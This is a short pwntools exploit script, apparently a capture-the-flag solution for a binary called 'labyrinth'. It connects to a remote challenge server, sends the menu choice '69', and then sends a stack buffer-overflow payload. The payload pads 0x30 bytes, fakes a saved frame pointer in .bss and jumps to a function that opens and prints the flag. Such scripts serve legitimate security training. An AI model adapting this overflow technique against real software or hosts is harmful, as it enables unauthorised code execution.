from pwn import *

exe = ELF("./labyrinth_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe
context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = 'INFO'
warnings.simplefilter("ignore")

remote_url = "167.99.86.8"
remote_port = 32088
gdbscript = '''
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            # gdb.attach(r, gdbscript=gdbscript)
            pause()
    else:
        r = remote(remote_url, remote_port)

    return r

r = conn()

# I choose to jump not to the start of escape_plan, but directly to the line that open and print the flag.
win_addr = 0x00000000004012b0
r.sendline(b'69')
payload = b'a'*0x30 + p64(exe.bss()+0x200)+p64(win_addr)
r.sendline(payload)

r.interactive()
